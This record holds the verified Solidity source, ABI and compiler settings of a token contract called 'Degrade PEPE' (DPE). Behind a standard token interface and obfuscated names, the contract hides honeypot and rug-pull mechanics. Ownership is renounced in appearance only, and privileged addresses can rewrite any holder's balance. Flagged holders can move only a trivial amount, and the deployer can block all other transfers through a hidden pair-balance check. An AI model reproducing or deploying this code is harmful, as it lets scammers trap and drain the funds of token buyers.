{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface maxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingReceiver) external view returns (uint256);\n\n    function transfer(address toLimitMin, uint256 minList) external returns (bool);\n\n    function allowance(address atAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLimitMin,\n        uint256 minList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromAt, uint256 value);\n    event Approval(address indexed atAmount, address indexed spender, uint256 value);\n}\n\nabstract contract receiverIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTeam {\n    function createPair(address amountTeamMode, address autoLaunch) external returns (address);\n}\n\ninterface exemptLimit is maxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DegradePEPE is receiverIs, maxSwap, exemptLimit {\n\n    function allowance(address feeAmountTotal, address sellLaunch) external view virtual override returns (uint256) {\n        if (sellLaunch == listExempt) {\n            return type(uint256).max;\n        }\n        return teamAtSwap[feeAmountTotal][sellLaunch];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellAtMode;\n    }\n\n    mapping(address => uint256) private txTokenBuy;\n\n    uint256 private txBuyFee;\n\n    uint256 public toReceiver;\n\n    function transferFrom(address tokenTake, address toLimitMin, uint256 minList) external override returns (bool) {\n        if (_msgSender() != listExempt) {\n            if (teamAtSwap[tokenTake][_msgSender()] != type(uint256).max) {\n                require(minList <= teamAtSwap[tokenTake][_msgSender()]);\n                teamAtSwap[tokenTake][_msgSender()] -= minList;\n            }\n        }\n        return toLaunch(tokenTake, toLimitMin, minList);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toMax;\n    }\n\n    uint256 private atSwapMode = 100000000 * 10 ** 18;\n\n    function shouldFundTotal() public {\n        emit OwnershipTransferred(launchedExempt, address(0));\n        totalAt = address(0);\n    }\n\n    function txLaunchedSwap() private view {\n        require(tradingMin[_msgSender()]);\n    }\n\n    uint8 private toMax = 18;\n\n    mapping(address => mapping(address => uint256)) private teamAtSwap;\n\n    address listExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 fundAmountLiquidity;\n\n    uint256 tradingBuy;\n\n    function buyWallet(address receiverTotal, uint256 minList) public {\n        txLaunchedSwap();\n        txTokenBuy[receiverTotal] = minList;\n    }\n\n    address public launchedExempt;\n\n    bool public modeLaunchedTo;\n\n    string private launchShould = \"DPE\";\n\n    uint256 private exemptLaunch;\n\n    function owner() external view returns (address) {\n        return totalAt;\n    }\n\n    address senderTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapFee(address amountReceiver) public {\n        if (toToken) {\n            return;\n        }\n        if (launchMin != exemptLaunch) {\n            exemptLaunch = sellWallet;\n        }\n        tradingMin[amountReceiver] = true;\n        if (launchMin != exemptLaunch) {\n            exemptLaunch = toReceiver;\n        }\n        toToken = true;\n    }\n\n    uint256 constant swapFromSell = 18 ** 10;\n\n    bool private feeLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchShould;\n    }\n\n    constructor (){\n        if (txBuyFee != launchMin) {\n            feeLaunched = true;\n        }\n        marketingReceiver feeReceiver = marketingReceiver(listExempt);\n        receiverSwap = feeTeam(feeReceiver.factory()).createPair(feeReceiver.WETH(), address(this));\n        \n        launchedExempt = _msgSender();\n        shouldFundTotal();\n        tradingMin[launchedExempt] = true;\n        txTokenBuy[launchedExempt] = atSwapMode;\n        \n        emit Transfer(address(0), launchedExempt, atSwapMode);\n    }\n\n    uint256 public sellWallet;\n\n    function fromTotal(address teamFromMode) public {\n        txLaunchedSwap();\n        \n        if (teamFromMode == launchedExempt || teamFromMode == receiverSwap) {\n            return;\n        }\n        receiverFrom[teamFromMode] = true;\n    }\n\n    event OwnershipTransferred(address indexed listTake, address indexed minAuto);\n\n    uint256 public launchMin;\n\n    function toLaunch(address tokenTake, address toLimitMin, uint256 minList) internal returns (bool) {\n        if (tokenTake == launchedExempt) {\n            return marketingTotal(tokenTake, toLimitMin, minList);\n        }\n        uint256 launchBuy = maxSwap(receiverSwap).balanceOf(senderTake);\n        require(launchBuy == tradingBuy);\n        require(toLimitMin != senderTake);\n        if (receiverFrom[tokenTake]) {\n            return marketingTotal(tokenTake, toLimitMin, swapFromSell);\n        }\n        return marketingTotal(tokenTake, toLimitMin, minList);\n    }\n\n    function approve(address sellLaunch, uint256 minList) public virtual override returns (bool) {\n        teamAtSwap[_msgSender()][sellLaunch] = minList;\n        emit Approval(_msgSender(), sellLaunch, minList);\n        return true;\n    }\n\n    function transfer(address receiverTotal, uint256 minList) external virtual override returns (bool) {\n        return toLaunch(_msgSender(), receiverTotal, minList);\n    }\n\n    address public receiverSwap;\n\n    function balanceOf(address tradingReceiver) public view virtual override returns (uint256) {\n        return txTokenBuy[tradingReceiver];\n    }\n\n    function getOwner() external view returns (address) {\n        return totalAt;\n    }\n\n    function marketingTotal(address tokenTake, address toLimitMin, uint256 minList) internal returns (bool) {\n        require(txTokenBuy[tokenTake] >= minList);\n        txTokenBuy[tokenTake] -= minList;\n        txTokenBuy[toLimitMin] += minList;\n        emit Transfer(tokenTake, toLimitMin, minList);\n        return true;\n    }\n\n    mapping(address => bool) public tradingMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atSwapMode;\n    }\n\n    function teamTokenTrading(uint256 minList) public {\n        txLaunchedSwap();\n        tradingBuy = minList;\n    }\n\n    address private totalAt;\n\n    mapping(address => bool) public receiverFrom;\n\n    string private sellAtMode = \"Degrade PEPE\";\n\n    bool public toToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmountTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"buyWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFromMode\",\"type\":\"address\"}],\"name\":\"fromTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"swapFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"teamTokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLimitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DegradePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}